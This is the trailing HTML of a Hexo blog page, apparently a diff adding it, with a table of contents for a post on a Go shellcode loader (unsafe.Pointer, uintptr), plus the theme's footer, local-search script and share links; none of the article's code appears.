+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-unsafePointer%E6%8C%87%E9%92%88%E5%9F%BA%E7%A1%80"><span class="toc-text">0x01 unsafePointer指针基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-unsafe-package"><span class="toc-text">0x02 unsafe package</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1x01-Unsafe-Pointer"><span class="toc-text">1x01 Unsafe.Pointer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uintptr"><span class="toc-text">uintptr</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#uintptr%E7%89%B9%E7%82%B9%E4%BB%A5%E5%8F%8A%E4%BD%9C%E7%94%A8"><span class="toc-text">uintptr特点以及作用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-ShellCode-Loader"><span class="toc-text">0x03 ShellCode Loader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Go-shellCode%E5%8A%A0%E8%BD%BD%E5%99%A8 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2FGolang-shellCode%25E5%258A%25A0%25E8%25BD%25BD%25E5%2599%25A8.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/Golang-shellCode%E5%8A%A0%E8%BD%BD%E5%99%A8.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
